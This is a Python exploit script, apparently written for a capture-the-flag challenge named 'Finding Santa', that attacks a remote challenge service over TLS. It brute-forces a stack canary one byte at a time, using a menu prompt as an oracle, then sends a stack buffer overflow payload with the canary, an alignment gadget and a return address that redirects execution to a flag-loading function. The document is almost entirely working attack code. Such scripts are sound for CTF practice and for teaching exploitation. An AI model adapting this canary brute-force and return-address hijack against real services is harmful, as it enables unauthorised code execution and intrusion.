#!/usr/bin/env python3
import argparse
import socket
import ssl
import struct
import sys
import time

HOST = "428c8aa9c65f0ddf.julec.tf"
PORT = 1337

PADDING = b"A" * 0x28
ALIGN_RET = 0x40101A
WIN_ADDR = 0x401B72  # load_flag_to_location
PLAY_GAME_ADDR = 0x4019A3
MENU_TOKEN = b"Where do you want to search?"
PROMPT_TOKEN = b">"


def build_socket():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    raw = socket.create_connection((HOST, PORT))
    return ctx.wrap_socket(raw, server_hostname=HOST)


def recv_all(sock, timeout=1.0):
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    except socket.timeout:
        pass
    return b"".join(chunks)


def recv_until(sock, token, timeout=1.0):
    sock.settimeout(timeout)
    buf = b""
    try:
        while token not in buf:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf


def prime_prompt(sock):
    """Consume the initial banner/prompt before sending input."""
    recv_all(sock, timeout=0.5)


def send_length_and_payload(sock, length, payload):
    sock.sendall(f"{length}\n".encode())
    recv_until(sock, b"what is your name?", timeout=1.0)
    sock.sendall(payload)

def send_choice(sock, choice, timeout=2.0):
    buf = recv_until(sock, PROMPT_TOKEN, timeout=timeout)
    sock.sendall(f"{choice}\n".encode())
    return buf


def test_canary(prefix):
    """Return True if the prefix matches the real canary bytes."""
    payload = PADDING + prefix
    length = len(payload)

    try:
        with build_socket() as s:
            prime_prompt(s)
            send_length_and_payload(s, length, payload)
            data = recv_all(s, timeout=1.0)
            return MENU_TOKEN in data
    except (ConnectionResetError, ssl.SSLError, OSError):
        return False


def brute_force_canary():
    known = b"\x00"  # Canary starts with a null byte on glibc.
    for idx in range(1, 8):
        for b in range(256):
            attempt = known + bytes([b])
            if test_canary(attempt):
                known = attempt
                print(f"[+] Canary so far: {known.hex()}")
                break
        else:
            raise RuntimeError("Failed to find next canary byte")
    return known


def exploit(canary, target):
    ret_addr = WIN_ADDR if target == "load" else PLAY_GAME_ADDR
    payload = (
        PADDING
        + canary
        + b"B" * 8  # saved RBP junk
        + struct.pack("<Q", ALIGN_RET)
        + struct.pack("<Q", ret_addr)
    )
    length = len(payload)

    with build_socket() as s:
        prime_prompt(s)
        send_length_and_payload(s, length, payload)
        output = recv_until(s, MENU_TOKEN, timeout=3.0)
        # Drive the game to the win path after load_flag_to_location repopulates the flag buffer.
        time.sleep(0.2)
        output += send_choice(s, 3, timeout=3.0)
        time.sleep(0.2)
        output += send_choice(s, 1, timeout=3.0)
        output += recv_all(s, timeout=4.0)

    return output


def main():
    parser = argparse.ArgumentParser(description="Exploit for Finding Santa")
    parser.add_argument("--canary", help="known canary value in hex")
    parser.add_argument(
        "--target",
        choices=["load", "play"],
        default="load",
        help="return to load_flag_to_location (default) or play_game",
    )
    parser.add_argument(
        "--bruteforce",
        action="store_true",
        help="brute-force the canary (slow but reliable)",
    )
    args = parser.parse_args()

    if args.canary:
        canary = bytes.fromhex(args.canary)
        if len(canary) != 8:
            print("Canary must be 8 bytes (16 hex chars)")
            sys.exit(1)
    elif args.bruteforce:
        print("[*] Brute forcing canary...")
        canary = brute_force_canary()
        print(f"[+] Canary found: {canary.hex()}")
    else:
        parser.error("Provide --canary or --bruteforce")
        return

    if not test_canary(canary):
        print("[!] Canary check failed: no menu prompt received.")
        print("[!] The instance may have a different canary. Try --bruteforce.")
        sys.exit(1)

    print("[*] Launching final payload...")
    result = exploit(canary, args.target)
    safe = result.decode("utf-8", "ignore").encode("ascii", "ignore").decode()
    print(safe)


if __name__ == "__main__":
    main()
